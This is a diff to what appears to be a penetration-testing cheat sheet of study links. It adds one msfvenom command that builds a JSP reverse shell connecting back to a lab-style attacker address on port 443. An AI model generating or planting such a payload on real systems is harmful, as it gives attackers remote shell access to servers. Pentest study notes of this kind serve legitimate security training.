@@ -64,6 +64,10 @@ Hashes decrypt:
 https://cmd5.ru/  
 https://hashes.org/  
 
+MSFVenom Shell:
+--------------------------------------------------
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw > shell.jsp  
+
 Links:
 --------------------------------------------------
 https://book.hacktricks.xyz/    //Cheat Sheet Pentesting all the thing   
@@ -75,5 +79,5 @@ https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-t
 https://www.fuzzysecurity.com/tutorials/16.html  //WindowsPrivEsc   
 https://refabr1k.gitbook.io/oscp/reverse-shell  //StudyNotes  
 https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html  //SQLTips  
-http://www.securityidiots.com/Web-Pentest/SQL-Injection/  //MoreSQL
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/  //MoreSQL  
 
